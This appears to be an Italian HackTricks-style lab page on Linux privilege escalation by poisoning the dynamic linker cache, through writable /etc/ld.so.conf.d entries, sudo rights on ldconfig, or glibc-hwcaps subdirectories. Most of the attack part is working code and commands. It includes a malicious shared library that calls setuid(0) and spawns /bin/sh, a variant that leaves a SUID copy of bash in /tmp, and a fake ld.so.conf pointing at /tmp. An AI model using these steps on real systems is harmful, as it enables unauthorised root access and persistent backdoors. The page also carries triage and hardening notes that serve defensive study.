# esempio di exploit privesc di ld.so

{{#include ../../banners/hacktricks-training.md}}

Questa pagina è un laboratorio focalizzato sul poisoning della **cache del linker di sistema tramite `/etc/ld.so.conf` o `ldconfig`**. Per l'injection di librerie mancanti, `RPATH`/`RUNPATH` scrivibili, `LD_PRELOAD` e altri abusi generici del linker SUID, consulta [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Preparare l'ambiente

Nella sezione seguente puoi trovare il codice dei file che utilizzeremo per preparare l'ambiente

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crea** quei file nella tua macchina, nella stessa cartella
2. **Compila la** **libreria**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` in `/usr/lib` e aggiorna la cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilegi root)
4. **Compila l'****eseguibile**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Controlla l'ambiente

Verifica che _libcustom.so_ venga **caricata** da _/usr/lib_ e che tu possa **eseguire** il binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandi utili per il triage

Quando attacchi un target reale, verifica il **nome esatto della libreria** necessaria al binario, cosa sta **risolvendo attualmente** il loader e quali percorsi configurati sono scrivibili senza modificare la cache attiva.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Usa `ldd` solo su un eseguibile **trusted**. Alcune implementazioni o interpreter ELF insoliti possono causare l'esecuzione di codice controllato dall'attacker; `objdump -p ./file | grep NEEDED` elenca in modo sicuro le dipendenze dirette. Per un target trusted, invocare l'interpreter individuato con `--list` mostra la risoluzione effettiva.<sup>[[4]](#references)</sup>

Alcuni dettagli importanti:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` di solito **non funziona** perché
il reindirizzamento viene eseguito dalla shell corrente. Usa invece
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- I binari **SUID/privileged** ignorano `LD_LIBRARY_PATH`/`LD_PRELOAD` in
**secure-execution mode**, ma le directory provenienti da `/etc/ld.so.conf` fanno
ancora parte della configurazione trusted del loader, quindi questa
misconfiguration può comunque influire sui programmi privileged.<sup>[[1]](#references)</sup>
- `LD_DEBUG` viene anch'esso ignorato in secure-execution mode a meno che non esista `/etc/suid-debug`; raccogli quindi il suo trace da un'esecuzione non-SUID equivalente invece di aspettarti un output dall'esecuzione privileged.<sup>[[1]](#references)</sup>
- Nelle versioni più recenti di glibc, il dynamic loader espone anche
`--list-diagnostics`, utile per eseguire il debug della risoluzione della cache e
della selezione delle sottodirectory `glibc-hwcaps` quando un hijack non si comporta come previsto.<sup>[[1]](#references)</sup>

### Vincoli di cache e SONAME

`ldconfig` non mette in cache ogni file arbitrario presente in una directory configurata: esamina gli header ELF, riconosce i nomi che corrispondono a `lib*.so*` o `ld-*.so*` e si aspetta la catena convenzionale `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. L'oggetto iniettato deve quindi avere l'architettura/classe del target, il nome `DT_NEEDED` esatto (normalmente il suo `DT_SONAME`) e tutti i simboli/versioni risolti dalla vittima.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Preferisci una libreria specifica per il target, come nell'esempio seguente. Il shadowing di un SONAME comune con un oggetto incompleto può interrompere ogni processo che lo risolve prima che venga eseguito il target privilegiato.<sup>[[3]](#references)</sup>

## Exploit

In questo scenario supporremo che **qualcuno abbia creato una voce vulnerabile** all'interno di un file in _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
La cartella vulnerabile è _/home/ubuntu/lib_ (dove abbiamo accesso in scrittura).\
**Scarica e compila** il seguente codice all'interno di quel percorso:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Se prevedi che **root** (o un altro account privilegiato) esegua in seguito il binary vulnerabile, di solito è meglio lasciare un **artefatto di proprietà di root** invece di avviare una shell interattiva. Ad esempio:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Quindi, dopo l'esecuzione privilegiata, puoi usare `/tmp/rootbash -p`.

Ora che abbiamo **creato la libreria malevola libcustom all'interno del percorso configurato in modo errato**, la cache predefinita deve essere ricostruita tramite un'esecuzione privilegiata riuscita di **`ldconfig`**. Un riavvio è utile solo quando il processo di avvio locale lo invoca effettivamente; altrimenti attendi un'azione dell'amministratore oppure usa una regola sudo non sicura, se disponibile.<sup>[[2]](#references)</sup>

Dopo che ciò è avvenuto, **ricontrolla** da dove l'eseguibile `sharedvuln` sta caricando la libreria `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Come puoi vedere, lo sta **caricando da `/home/ubuntu/lib`** e, se un qualsiasi utente lo esegue, verrà eseguita una shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Nota che in questo esempio non abbiamo effettuato un'escalation dei privilegi, ma modificando i comandi eseguiti e **aspettando che root o un altro utente privilegiato esegua il binary vulnerabile** saremo in grado di effettuare un'escalation dei privilegi.

### Modern `glibc-hwcaps` shadowing

A partire da glibc 2.33, il loader può preferire le librerie ottimizzate presenti in `glibc-hwcaps/<level>/` all'interno di **ogni directory di ricerca delle librerie**. Di conseguenza, controllare solo `/home/ubuntu/lib` non è sufficiente: una sottodirectory compatibile e scrivibile, come `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, può fare shadowing della libreria di base dopo che `ldconfig` l'ha indicizzata, mentre altre CPU continuano a utilizzare l'oggetto di base. Questo fornisce anche un hijack selettivo per architettura, che può non essere rilevato quando la validazione viene eseguita su una CPU diversa.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Le linee guida attuali sul hardening di glibc raccomandano di evitare SONAME duplicati, percorsi di ricerca non predefiniti e oggetti nelle sottodirectory `glibc-hwcaps`. Dal punto di vista dell'audit, applica ricorsivamente i controlli di ownership e scrivibilità alle directory configurate e ai componenti del percorso padre.<sup>[[3]](#references)</sup>

### Altre misconfigurazioni - Same vuln

Nell'esempio precedente abbiamo simulato una misconfigurazione in cui un amministratore **ha impostato una cartella non privilegiata all'interno di un file di configurazione dentro `/etc/ld.so.conf.d/`**.\
Ma esistono altre misconfigurazioni che possono causare la stessa vulnerabilità: se disponi di **permessi di scrittura** su un **file di configurazione** all'interno di `/etc/ld.so.conf.d`, nella cartella `/etc/ld.so.conf.d` o nel file `/etc/ld.so.conf`, puoi configurare la stessa vulnerabilità ed eseguirne l'exploit.

## Exploit 2

**Supponiamo che tu disponga di privilegi sudo su `ldconfig`**.\
Puoi indicare a `ldconfig` **da dove caricare i file di configurazione**, quindi possiamo approfittarne per fare in modo che `ldconfig` carichi cartelle arbitrarie.<sup>[[2]](#references)</sup>\
Creiamo quindi i file e le cartelle necessari per caricare "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ora, come indicato nel **precedente exploit**, **crea la libreria malevola all'interno di `/tmp`**.\
E infine, carichiamo il path e verifichiamo da dove il binario sta caricando la libreria:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Come puoi vedere, disponendo di privilegi sudo su `ldconfig` puoi sfruttare la stessa vulnerabilità.** I dettagli delle opzioni sono importanti quando si valuta una regola sudo con restrizioni: `-f` seleziona un'altra configurazione, ma ricostruisce comunque `/etc/ld.so.cache`; `-C` reindirizza la cache altrove; `-N` impedisce la ricostruzione della cache; e `-X` impedisce gli aggiornamenti dei link, ma **ricostruisce comunque la cache, a meno che non venga combinato con `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening del Dynamic Linker - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
{{#include ../../banners/hacktricks-training.md}}
